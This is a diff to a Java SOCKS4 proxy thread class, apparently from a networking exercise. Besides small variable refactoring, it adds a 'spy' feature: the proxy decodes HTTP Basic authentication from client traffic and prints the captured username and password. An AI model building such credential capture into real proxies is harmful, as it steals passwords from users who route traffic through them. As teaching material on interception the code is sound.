@@ -13,7 +13,8 @@ class ClientThread implements Runnable {
     private Selector selector ;
   private SelectionKey keyDestination;
   private SelectionKey keyClient;
-
+  private String clientsIP=null;//to be used if connection succseed
+private String clientsPORT=null;
     ClientThread(SocketChannel clientChannel) {
         this.clientChannel = clientChannel;
 
@@ -21,8 +22,6 @@ class ClientThread implements Runnable {
     }
         @Override
         public void run () {
-            String clientsIP=null ; //to be used if connection succseed
-            String clientsPORT=null;
             try {
 
                 //Parse Socks 4 request
@@ -51,8 +50,8 @@ class ClientThread implements Runnable {
                 // set some constants
                 String DSTIP = (String) map.get("DSTIP");
                 int DSTPORT = (int) map.get("DSTPORT");
-                clientsIP = "127.0.0.1";
-                clientsPORT = (this.clientChannel.getRemoteAddress().toString()).replaceFirst("(.*):(.*)$","$2");
+                this.clientsIP = "127.0.0.1";
+                this.clientsPORT = (this.clientChannel.getRemoteAddress().toString()).replaceFirst("(.*):(.*)$","$2");
 
                 this.destinationChannel = SocketChannel.open();
                 InetSocketAddress destinationAddress = new InetSocketAddress(DSTIP, DSTPORT);
@@ -64,7 +63,7 @@ class ClientThread implements Runnable {
                 }
                 //else
                 MessageParser.Socks4ReplyWriter(90, clientChannel);
-                System.out.println("Successful connection from " + clientsIP+":"+clientsPORT+ " to "+DSTIP + ":" + DSTPORT);
+                System.out.println("Successful connection from " + this.clientsIP+":"+this.clientsPORT+ " to "+DSTIP + ":" + DSTPORT);
 
                 //establish selector
                 this.establishSelector(clientChannel, destinationChannel);
@@ -112,7 +111,7 @@ class ClientThread implements Runnable {
                         System.err.println(e.getMessage());
                     }
             finally{
-                System.out.println("Closing connection from:  "+clientsIP+":"+clientsPORT);
+                System.out.println("Closing connection from:  "+this.clientsIP+":"+this.clientsPORT);
                         try {
                             if (this.clientChannel != null)
                                 this.clientChannel.close();
@@ -142,11 +141,12 @@ class ClientThread implements Runnable {
 
                 x.flip();
             String message = new String(Arrays.copyOfRange(x.array(), 0, byteRed));
-                if(isClient) {
-//                    TODO: ADD the 'spy' element.
-
+            //this is the "spy" effect.
+                if(isClient)
+                {
+                   String auth=MessageParser.basicAUthenticaitionExtractorAndDecoder(message);
+                    System.out.println("Password Found! http://"+auth);
                 }
-//                System.out.println("message:"+message);
                 int bytewritten=reciver.write(x);
                 x.clear();
                 if(bytewritten!=message.length())
